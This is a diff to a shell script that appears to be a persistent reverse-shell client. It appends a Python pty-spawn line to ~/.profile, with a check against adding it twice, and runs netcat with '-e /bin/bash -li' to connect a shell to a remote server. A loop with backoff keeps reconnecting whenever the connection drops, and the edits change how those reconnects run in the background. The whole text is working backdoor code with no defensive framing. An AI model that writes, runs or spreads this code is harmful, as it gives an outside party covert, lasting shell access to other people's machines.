@@ -135,7 +135,7 @@ connect_setup() {
     # sleep 5 && [ ! $RSRET -eq 120 ] && connect_again_flag=1
 
     echo "# Welcome and live your life" >> ~/.profile
-    echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> ~/.profile
+    [ -z "$(grep pty ~/.profile)" ] && echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> ~/.profile
     $NC -w ${1}s -i 1800s $SERVER $PORT -e "/bin/bash -li"
     RSRET=$?
     echo $RSRET > $EXIT_FILE_PATH
@@ -155,7 +155,7 @@ connect_setup() {
 connect_again() {
   # pkill -f "nc.*$PORT"  # no need now, our listen server can accept multiple
   # connection now
-  connect_setup $1 & # just put connection to background
+  connect_setup $1
 }
 
 WAIT_LIMIT=2048
@@ -186,7 +186,7 @@ while true; do
       wait_time=$INIT_WAIT
       # previous connection is lost, we wait for longer to setup connection
       check_exit_status || wait_time=15
-      connect_again $wait_time
+      connect_again $wait_time &
     else
       wait_time=$((wait_time + wait_time)) # double wait, network fine
 
@@ -198,12 +198,12 @@ while true; do
       echo "found connection loss, reset wait_time and try to reconnect"
       wait_time=$INIT_WAIT
       check_exit_status || wait_time=15 # previous connection is lost
-      connect_again $wait_time
+      connect_again $wait_time &
     else # no connection all the time? we still try to connect...
       wait_time=$((wait_time + wait_time))
 
       if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
-      connect_again $wait_time
+      connect_again $wait_time &
     fi
     port_connect_status=0
   fi
